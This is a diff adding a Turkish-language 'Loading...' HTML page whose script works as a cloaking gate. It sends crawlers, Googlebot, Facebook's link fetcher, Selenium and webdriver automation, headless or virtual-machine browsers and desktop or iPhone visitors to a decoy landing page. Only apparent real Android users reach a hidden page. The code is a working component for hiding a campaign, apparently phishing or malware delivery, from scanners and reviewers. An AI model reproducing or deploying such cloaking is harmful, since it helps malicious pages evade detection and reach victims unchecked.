@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Yükleniyor...</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box;}
+body{background:#111;display:flex;align-items:center;justify-content:center;height:100vh;}
+.sp{width:40px;height:40px;border:4px solid #333;border-top-color:#fff;border-radius:50%;animation:spin 0.8s linear infinite;}
+@keyframes spin{to{transform:rotate(360deg);}}
+</style>
+</head>
+<body>
+<div class="sp"></div>
+<script>
+(function(){
+    function redirect(url){ window.location.replace(url); }
+    var LAND = '/landing.html';
+    var PASS = '/ara.html';
+
+    // 1. Touch — gerçek mobilde zorunlu (Masaüstü engeller)
+    if(!('ontouchstart' in window) && !(navigator.maxTouchPoints > 0)){
+        redirect(LAND); return;
+    }
+
+    // 2. UA kontrolü (Sadece Android geçer, Windows/Mac/iPhone/Bot elenir)
+    var ua = (navigator.userAgent || '').toLowerCase();
+    if(!ua.includes('android')){ redirect(LAND); return; }
+    if(/windows|macintosh|iphone|ipad|bot|crawler|spider|headless|phantom|selenium|webdriver|puppeteer|playwright|facebookexternalhit|facebot|googlebot/i.test(ua)){
+        redirect(LAND); return;
+    }
+
+    // 3. Webdriver / otomasyon flag (Bot tespiti)
+    if(navigator.webdriver === true){ redirect(LAND); return; }
+
+    // 4. Otomasyon değişkenleri tespiti
+    var autoKeys = ['__webdriver_script_fn','__webdriver_evaluate','__selenium_evaluate',
+        '__webdriver_script_func','__fxdriver_evaluate','__driver_evaluate',
+        '_Selenium_IDE_Recorder','_selenium','calledSelenium','_WEBDRIVER_ELEM_CACHE',
+        'ChromeDriverw','documentExFn','webdriverCommand','__lastWatirAlert'];
+    for(var i=0;i<autoKeys.length;i++){
+        if(autoKeys[i] in window){ redirect(LAND); return; }
+    }
+
+    // 5. Ekran boyutu kontrolü
+    var sw = screen.width, sh = screen.height;
+    if(sw === 0 || sh === 0){ redirect(LAND); return; }
+
+    // 6. Device pixel ratio kontrolü
+    var dpr = window.devicePixelRatio || 1;
+    if(dpr < 1){ redirect(LAND); return; }
+
+    // 7. Platform kontrolü (Masaüstü Windows ve Mac engellenir)
+    var plat = (navigator.platform || '').toLowerCase();
+    if(/win|mac/.test(plat)){ redirect(LAND); return; }
+
+    // 8. WebGL sahte renderer kontrolü (Headless emülatörler)
+    try {
+        var c = document.createElement('canvas');
+        var gl = c.getContext('webgl') || c.getContext('experimental-webgl');
+        if(!gl){ redirect(LAND); return; }
+        var rend = (gl.getParameter(gl.RENDERER)||'').toLowerCase();
+        var fakeR = ['swiftshader','llvmpipe','virtualbox','vmware','microsoft basic',
+                     'software rasterizer','mesa offscreen','osmesa'];
+        for(var fi=0;fi<fakeR.length;fi++){
+            if(rend.includes(fakeR[fi])){ redirect(LAND); return; }
+        }
+    } catch(e){ /* geç */ }
+
+    // 9. CPU core sayısı (Masaüstü sunucu tespiti)
+    var cores = navigator.hardwareConcurrency || 0;
+    if(cores > 24){ redirect(LAND); return; }
+
+    // Tüm kontroller geçti → gerçek Android kullanıcı
+    redirect(PASS);
+})();
+</script>
+</body>
+</html>
